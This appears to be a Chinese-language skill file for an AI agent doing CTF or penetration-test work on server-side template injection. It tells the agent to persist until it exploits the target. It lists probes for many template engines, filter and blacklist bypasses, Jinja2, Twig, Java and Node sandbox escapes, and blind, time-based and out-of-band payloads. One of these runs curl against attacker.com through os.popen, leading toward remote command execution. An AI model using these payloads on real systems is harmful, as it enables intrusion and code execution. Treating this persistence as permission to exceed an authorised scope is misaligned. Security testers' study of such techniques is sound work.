---
name: ssti-bypass-skill
tags:
  - ssti
  - template-injection
  - server-side-template-injection
  - jinja2
  - flask
  - django
  - twig
  - freemarker
  - spel
  - thymeleaf
  - render_template_string
  - from_string
  - template-source
  - second-render
  - statement-tag
  - output-constraint
description: 面向授权 CTF/渗透测试目标的 SSTI 专项技能。适用于黑盒或白盒服务端模板注入，包括 Jinja2/Flask render_template_string、Django template Engine.from_string/from_string、Twig、Smarty、Blade、Latte、FreeMarker、Velocity、SpEL、OGNL、Thymeleaf、Pebble、Jinjava、EJS、Pug、Handlebars、Nunjucks、Lodash、ERB、Slim、Liquid、Razor/ASP.NET、Go template、EEx 等模板引擎。覆盖响应驱动探测、完整入口枚举、延迟/二次渲染、session 或工作流携带输入、引擎指纹、黑名单绕过、statement-tag payload、sandbox escape、文件/配置读取、输出形态约束、盲注/time/OOB/RCE 验证，以及避免对题目过拟合的大范围 payload 喷洒。
---

# ssti-bypass-skill

专注于服务端模板注入（SSTI）的检测、识别与利用。你的目标是确认 SSTI 漏洞的存在，识别模板引擎类型，绕过任何限制，并最终获取 flag 或执行命令。

## 核心目标

**如果存在 SSTI 漏洞，必须检测出来并成功利用。**

不要被表面的限制或单次失败劝退。SSTI 的探测和利用需要：
- **完整的入口覆盖**：每个输入点、每种请求方式、每个延迟消费场景
- **多样的探针矩阵**：不同语法族、不同上下文、不同反馈通道
- **持续的绕过尝试**：过滤器、沙箱、输出约束都有绕过方法

## 关键原则

### 1. 全面探测，不要遗漏

SSTI 可能出现在：
- **所有输入点**：GET/POST 参数、JSON 字段、multipart、headers、cookies、路径段
- **延迟渲染点**：不在当前响应，而是在确认页、预览、个人中心、导出、邮件、通知、错误页、后台审核
- **模板相关位置**：模板名、视图名、include 路径、layout 名、helper 名
- **会话状态**：session、JWT claims、服务端 profile、购物车、草稿

**常见遗漏场景**：
- 只测了当前页面响应，没测后续页面的二次渲染
- 只测了一个语法族（如 `{{}}`），没测其他分隔符（`${}`、`#{}`、`<%= %>`）
- 只测了直接回显，没测盲注（时间、OOB、布尔、错误回显）
- 只测了表单字段，没测 headers、cookies、模板名

### 2. 不要用单个失败否定漏洞

一个 payload 失败不代表没有 SSTI：
- 可能是引擎类型不对（Jinja vs Django vs Twig vs FreeMarker...）
- 可能是上下文不对（需要先闭合字符串、标签、表达式）
- 可能是延迟渲染（当前响应不显示，在后续页面才求值）
- 可能是盲注（无回显但实际执行了）
- 可能需要 statement tag（`{% ... %}` 而非 `{{ ... }}`）

### 3. 响应驱动，不要盲目喷射

根据响应类型选择策略：

| 响应信号 | 说明 | 下一步 |
|---------|------|--------|
| `49`、`1097`、数值变化 | 已确认求值 | 立即指纹引擎，升级利用 |
| 对象展开、debug 信息、context 泄露 | 进入模板上下文 | 枚举可用对象，读取敏感信息 |
| 模板错误栈、语法错误 | 到达引擎但语法不对 | 换同引擎合法语法或闭合上下文 |
| `forbidden characters`、WAF block | 前置过滤 | 定位禁用字符，换 statement tag 或编码 |
| 原样反射、HTML 转义 | 未求值或延迟渲染 | 检查后续页面、二次渲染场景 |
| 无回显但时间/状态变化 | 盲执行 | 改用时间、OOB、布尔、写文件 |
| `not a number`、格式校验失败 | 后置校验 | 保持输出格式合法，敏感操作放语句块 |

### 4. 充分的探针矩阵

对每个可疑入口，至少测试：

**基础算术探针**（多引擎覆盖）：
```text
{{7*7}}                              Jinja2/Twig/Nunjucks/Handlebars
{{364|add:733}}                      Django
${7*7}                               FreeMarker/Java EL/Mako/Groovy
#{7*7}                               SpEL/Thymeleaf/FreeMarker
<%= 7*7 %>                           ERB/EJS/ASP/EEx
@(7*7)                               Razor
{{.}}  {{printf "%d" 49}}            Go template
```

**上下文探针**（检测可用对象）：
```text
{{config}}                           Flask config
{% debug %}                          Django/Jinja debug
{{_context}}  {{dump(_context)}}     Twig context
{{request}}  {{session}}             通用请求/会话对象
```

**延迟/二次渲染探针**：
- 提交 payload 后访问所有后续页面（确认页、预览、个人中心、导出）
- 检查错误页、通知、邮件模板
- 检查后台管理界面（如果可访问）

**盲注探针**：
```text
时间:   {% if lipsum.__globals__['os'].popen('sleep 3').read() %}{% endif %}
布尔:   {% if 7*7==49 %}A{% else %}B{% endif %}
错误:   {{''.__class__.__mro__[1].__subclasses__()[xxx]}}
OOB:    {{lipsum.__globals__['os'].popen('curl attacker.com').read()}}
```

### 5. 绕过限制的系统方法

遇到过滤或限制时，按以下优先级尝试：

**禁止 `{{ }}`**：
- 改用 statement tag：`{% if 7*7==49 %}49{% endif %}`
- 改用其他分隔符：`${7*7}`、`#{7*7}`、`<%= 7*7 %>`
- 视图名预处理：`__${...}__::.x`（Thymeleaf）

**禁止特定字符**：
- `.` → 用 `['attr']` 或 `|attr('attr')`
- `_` → 用 `\x5f` 或参数传入
- `'` → 用参数传入或字符构造
- 空格 → 直接去掉或用 `$IFS`
- 括号 → 用管道和过滤器：`{{'id'|map('system')}}`

**禁止关键字**：
- `os` → 参数传入或字符拼接：`'o'+'s'`
- `__globals__` → 用 `\x5f\x5f...\x5f\x5f` 或 attr
- `config` → 用 `request.application`、`url_for.__globals__`

**输出格式校验**（如只能输出数字）：
- 把敏感操作放在语句块里，最终输出合法值：
  ```jinja2
  {% set x = read_flag() %}123
  ```
- 改用盲注通道（时间、OOB、写文件）

**沙箱限制**：
- Jinja2：`lipsum.__globals__`、`cycler.__init__.__globals__`、`config.__class__.from_envvar.__globals__`
- Twig：`_self.env.registerUndefinedFilterCallback`、map/filter/reduce
- Java：`''.getClass().forName(...)`
- Node：`constructor`、`__proto__`、`process.mainModule`

## 执行策略

1. **建立基线**：对每个入口记录正常输入的响应（长度、状态码、反射位置）
2. **多引擎探针**：并行测试所有主流语法族，不要只测一种
3. **覆盖延迟消费**：访问所有后续页面和可能的二次渲染点
4. **识别引擎**：根据成功的探针和错误信息确定引擎类型
5. **测试执行能力**：从低风险的 context/config 读取开始，逐步升级
6. **绕过限制**：遇到过滤时系统地尝试绕过方法
7. **选择反馈通道**：根据约束选择直接回显、盲注、OOB 等方式
8. **获取 flag**：优先从已知路径、环境变量、配置读取

## 参考资料

`references/bypass-playbook.md` 包含：
- 完整的响应分类决策树
- 各引擎的详细 payload 库
- 系统的过滤绕过技术
- 盲注和无回显场景处理
- 沙箱逃逸方法

需要时查阅相关章节，但不要机械地从上到下尝试所有 payload。根据响应证据选择性使用。
